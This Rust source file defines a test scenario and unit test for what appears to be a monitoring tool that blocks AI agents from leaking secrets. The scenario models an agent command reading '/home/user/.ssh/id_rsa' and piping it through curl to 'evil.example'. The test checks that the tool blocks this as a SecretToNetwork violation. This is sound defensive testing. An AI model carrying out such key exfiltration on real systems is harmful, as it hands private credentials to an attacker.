use crate::events::{Endpoint, Event, Fd, PipeId, ProcessId, StartTime, Timestamp};

use super::Scenario;

pub fn secret_to_network() -> Scenario {
    let cat = ProcessId::new(300, StartTime(2_000));
    let curl = ProcessId::new(301, StartTime(2_010));
    let endpoint = Endpoint::tcp("evil.example", 443);

    Scenario::new(
        "secret_to_network",
        vec![
            Event::AgentLaunch {
                process: cat.clone(),
                command: vec!["cat".into(), "/home/user/.ssh/id_rsa".into()],
                at: Timestamp(1),
            },
            Event::Pipe {
                process: cat.clone(),
                pipe: PipeId(2),
                read_fd: Fd(4),
                write_fd: Fd(5),
                at: Timestamp(2),
            },
            Event::Fork {
                parent: cat.clone(),
                child: curl.clone(),
                at: Timestamp(3),
            },
            Event::Dup {
                process: curl.clone(),
                from_fd: Fd(4),
                to_fd: Fd(0),
                at: Timestamp(4),
            },
            Event::Open {
                process: cat.clone(),
                fd: Fd(3),
                path: "/home/user/.ssh/id_rsa".into(),
                at: Timestamp(5),
            },
            Event::Read {
                process: cat.clone(),
                fd: Fd(3),
                len: 256,
                at: Timestamp(6),
            },
            Event::Write {
                process: cat.clone(),
                fd: Fd(5),
                len: 256,
                at: Timestamp(7),
            },
            Event::Read {
                process: curl.clone(),
                fd: Fd(0),
                len: 256,
                at: Timestamp(8),
            },
            Event::Connect {
                process: curl.clone(),
                fd: Fd(6),
                endpoint,
                at: Timestamp(9),
            },
            Event::Send {
                process: curl,
                fd: Fd(6),
                len: 256,
                at: Timestamp(10),
            },
        ],
    )
}

#[cfg(test)]
mod tests {
    use crate::graph::EdgeKind;
    use crate::policy::{DecisionKind, PolicyId};
    use crate::scenarios::ScenarioRunner;

    use super::secret_to_network;

    #[test]
    fn secret_to_network_blocks_secret_send_with_full_explanation() {
        let scenario = secret_to_network();

        let outcome = ScenarioRunner::new().run(&scenario);

        assert_eq!(outcome.graph.edges.len(), 5);
        assert!(
            outcome
                .graph
                .edges
                .iter()
                .any(|edge| edge.kind == EdgeKind::Send)
        );
        assert_eq!(outcome.enforcement.decision.kind, DecisionKind::Block);
        assert_eq!(outcome.enforcement.decision.violations.len(), 1);
        assert_eq!(
            outcome.enforcement.decision.violations[0].policy,
            PolicyId::SecretToNetwork
        );
        assert_eq!(outcome.explanations.len(), 1);
        assert_eq!(outcome.explanations[0].path.len(), 4);
    }
}
